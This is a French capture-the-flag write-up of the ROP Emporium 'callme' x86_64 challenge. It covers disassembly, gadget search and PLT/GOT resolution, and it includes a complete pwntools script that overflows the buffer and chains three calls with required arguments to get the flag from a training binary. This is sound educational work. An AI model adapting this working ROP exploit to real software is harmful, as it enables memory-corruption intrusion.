---
Title: Ropemporium x86_64 callme
Date: 2023-06-03
Tags: [linux, python, ROP, x86_64, ropemporium]
Categories: [write-up]
Author: cdpointpoint
---

# callme

## Introduction

Cette fois-ci on doit appeler trois fonctions successivement avec des paramètres attendus.

## Découverte

```sh
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:	push   rbp
   0x00000000004008f3 <+1>:	mov    rbp,rsp
   0x00000000004008f6 <+4>:	mov    edx,0x6
   0x00000000004008fb <+9>:	mov    esi,0x5
   0x0000000000400900 <+14>:	mov    edi,0x4
   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three:@plt>
   0x000000000040090a <+24>:	mov    edx,0x6
   0x000000000040090f <+29>:	mov    esi,0x5
   0x0000000000400914 <+34>:	mov    edi,0x4
   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:	mov    edi,0x1
   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
End of assembler dump.
```

Test en appelant cette fonction à la mode ret2win :

```sh
03_callme$ python3 step1.py
[*] '/home/jce/w/ropemporium/x64/03_callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/jce/w/ropemporium/x64/03_callme/callme': pid 11882
usefulFunc=4008f2
[*] Switching to interactive mode
[*] Process '/home/jce/w/ropemporium/x64/03_callme/callme' stopped with exit code 1 (pid 11882)
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
Incorrect parameters
```

## Analyse d'une des fonctions

Cette analyse n'est pas indispensable à l'exercice, on sait qu'il faut appeler les trois
fonctions dans l'ordre avec les bons paramètres.

```C
void callme_one(long param_1,long param_2,long param_3)

{
  FILE *__stream;

  if (((param_1 != L'\xdeadbeef') || (param_2 != L'\xcafebabe')) || (param_3 != L'\xd00df00d')) {
    puts("Incorrect parameters");
    exit(1);
  }
  __stream = fopen("encrypted_flag.dat","r");
  if (__stream == (FILE *)0x0) {
    puts("Failed to open encrypted_flag.dat");
    exit(1);
  }
  g_buf = (char *)malloc(0x21);
  if (g_buf == (char *)0x0) {
    puts("Could not allocate memory");
    exit(1);
  }
  g_buf = fgets(g_buf,0x21,__stream);
  fclose(__stream);
  puts("callme_one() called correctly");
  return;
}
```

Call_me one teste les 3 paramètres attendus puis met à jour une variable globale : g_buf.

```C
void callme_two(long param_1,long param_2,long param_3)

{
  int iVar1;
  FILE *__stream;
  int i;

  if (((param_1 == L'\xdeadbeef') && (param_2 == L'\xcafebabe')) && (param_3 == L'\xd00df00d')) {
    __stream = fopen("key1.dat","r");
    if (__stream == (FILE *)0x0) {
      puts("Failed to open key1.dat");
      exit(1);
    }
    for (i = 0; i < 0x10; i = i + 1) {
      iVar1 = fgetc(__stream);
      *(byte *)(i + g_buf) = *(byte *)(i + g_buf) ^ (byte)iVar1;
    }
    puts("callme_two() called correctly");
    return;
  }
  puts("Incorrect parameters");
  exit(1);
}

void ls(long param_1,long param_2,long param_3)

{
  int iVar1;
  FILE *__stream;
  int ix;

  if (((param_1 == L'\xdeadbeef') && (param_2 == L'\xcafebabe')) && (param_3 == L'\xd00df00d')) {
    __stream = fopen("key2.dat","r");
    if (__stream == (FILE *)0x0) {
      puts("Failed to open key2.dat");
      exit(1);
    }
    for (ix = 0x10; ix < 0x20; ix = ix + 1) {
      iVar1 = fgetc(__stream);
      g_buf[ix] = g_buf[ix] ^ (byte)iVar1;
    }
    *(ulong *)(g_buf + 4) = *(ulong *)(g_buf + 4) ^ 0xdeadbeefdeadbeef;
    *(ulong *)(g_buf + 0xc) = *(ulong *)(g_buf + 0xc) ^ 0xcafebabecafebabe;
    *(ulong *)(g_buf + 0x14) = *(ulong *)(g_buf + 0x14) ^ 0xd00df00dd00df00d;
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}
```

callme_three vérifie les paramètres ainsi que l'état final de la variable globale

```sh
Dump of assembler code for function callme_two:
   0x00007ffff7dc892b <+0>:	push   rbp
   0x00007ffff7dc892c <+1>:	mov    rbp,rsp
   0x00007ffff7dc892f <+4>:	sub    rsp,0x30
   0x00007ffff7dc8933 <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x00007ffff7dc8937 <+12>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00007ffff7dc893b <+16>:	mov    QWORD PTR [rbp-0x28],rdx
   0x00007ffff7dc893f <+20>:	movabs rax,0xdeadbeefdeadbeef
   0x00007ffff7dc8949 <+30>:	cmp    QWORD PTR [rbp-0x18],rax
   0x00007ffff7dc894d <+34>:	jne    0x7ffff7dc8a14 <callme_two+233>
   0x00007ffff7dc8953 <+40>:	movabs rax,0xcafebabecafebabe
   0x00007ffff7dc895d <+50>:	cmp    QWORD PTR [rbp-0x20],rax
   0x00007ffff7dc8961 <+54>:	jne    0x7ffff7dc8a14 <callme_two+233>
   0x00007ffff7dc8967 <+60>:	movabs rax,0xd00df00dd00df00d
   0x00007ffff7dc8971 <+70>:	cmp    QWORD PTR [rbp-0x28],rax
   0x00007ffff7dc8975 <+74>:	jne    0x7ffff7dc8a14 <callme_two+233>
   0x00007ffff7dc897b <+80>:	mov    QWORD PTR [rbp-0x8],0x0
```


On voit que les paramètres attendus sont respectivement :
0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d


Recherche de gadgets :

``` C
# ROPgadget --binary callme |grep "pop rdi"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
```

On retient l'usage gadget en 0x40093c qui va nous permettre de charger en une fois les 3 registres qui nous intéressent.

Comment appeler les fonctions callme_

On retrouve les références des fonctions dans deux tables :

La GOT contient les adresses de toutes le fonctions externes.

``` sh
# rabin2 -R callme
[Relocations]
vaddr      paddr      type   name
―――――――――――――――――――――――――――――――――
0x00600ff0 0x00000ff0 SET_64 __libc_start_main
0x00600ff8 0x00000ff8 SET_64 __gmon_start__
0x00601018 0x00001018 SET_64 puts
0x00601020 0x00001020 SET_64 printf
0x00601028 0x00001028 SET_64 callme_three
0x00601030 0x00001030 SET_64 memset
0x00601038 0x00001038 SET_64 read
0x00601040 0x00001040 SET_64 callme_one
0x00601048 0x00001048 SET_64 setvbuf
0x00601050 0x00001050 SET_64 callme_two
0x00601058 0x00001058 SET_64 exit
0x00601070 0x00601070 ADD_64 stdout
```

Le sous gdb :

```sh
GOT protection: Partial RelRO | GOT functions: 9

[0x601018] puts@GLIBC_2.2.5  →  0x4006d6
[0x601020] printf@GLIBC_2.2.5  →  0x4006e6
[0x601028] callme_three  →  0x4006f6
[0x601030] memset@GLIBC_2.2.5  →  0x400706
[0x601038] read@GLIBC_2.2.5  →  0x400716
[0x601040] callme_one  →  0x400726
[0x601048] setvbuf@GLIBC_2.2.5  →  0x400736
[0x601050] callme_two  →  0x400746
[0x601058] exit@GLIBC_2.2.5  →  0x400756
```

La GOT n'est pas directement référencée dans le code.
Les instructions call de fonctions importées visent une table intermédiaire, la table PLT :

```
# rabin2 -i callme
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       puts
2   0x004006e0 GLOBAL FUNC       printf
3   0x004006f0 GLOBAL FUNC       callme_three
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00400720 GLOBAL FUNC       callme_one
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x00400730 GLOBAL FUNC       setvbuf
10  0x00400740 GLOBAL FUNC       callme_two
11  0x00400750 GLOBAL FUNC       exit
```

Exemple de l'appel de callme_one :

``` sh
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
```

avec :

``` sh
gef➤  x/4i 0x00400720
   0x400720 <callme_one@plt>:	jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <callme_one@got.plt>
   0x400726 <callme_one@plt+6>:	push   0x5
   0x40072b <callme_one@plt+11>:	jmp    0x4006c0
   0x400730 <setvbuf@plt>:	jmp    QWORD PTR [rip+0x200912]        # 0x601048 <setvbuf@got.plt>
```

C'est l'adresse de la PLT qu'il faut utiliser.
La GOT ne contient pas une instruction mais l'adresse de la fonction dans la librairie libcallme.so.

Dans notre script python, avec pwntool elf.plt['call_me_one'] nous donne l'adresse 0x400720.

## Construction de la chaine de ROP

| ROP entry | comment |
| ----------- | ------- |
| pop3 gadget       | pop rdi ; pop rsi ; pop rdx ; ret |
| 0xdeadbeefdeadbeef | param1 |
| 0xcafebabecafebabe | param2 |
| 0xd00df00dd00df00d | param3 |
| callme_one@plt |  |
| pop3        | pop rdi ; pop rsi ; pop rdx ; ret |
| 0xdeadbeefdeadbeef | param1 |
| 0xcafebabecafebabe | param2 |
| 0xd00df00dd00df00d | param3 |
| callme_two@plt |  |
| pop3        | pop rdi ; pop rsi ; pop rdx ; ret |
| 0xdeadbeefdeadbeef | param1 |
| 0xcafebabecafebabe | param2 |
| 0xd00df00dd00df00d | param3 |
| callme_three@plt |  |

## Script python

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+87
c
'''


# Set up pwntools for the correct architecture
elf =  ELF('callme')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x28

callme_one=elf.plt['callme_one']
callme_two=elf.plt['callme_two']
callme_three=elf.plt['callme_three']

# pop rdi ; pop rsi ; pop rdx ; ret
pop_3=0x40093c

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_one)
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_two)
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_three)

io.sendline(PL)
io.interactive()
```

### Exécution

``` sh
03_callme$ python3 solve.py
[*] '/home/jce/w/ropemporium/x64/03_callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/jce/w/ropemporium/x64/03_callme/callme': pid 5846
[*] callme_one=400720
[*] callme_two=400740
[*] callme_three=4006f0
[*] Switching to interactive mode
[*] Process '/home/jce/w/ropemporium/x64/03_callme/callme' stopped with exit code 0 (pid 5846)
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

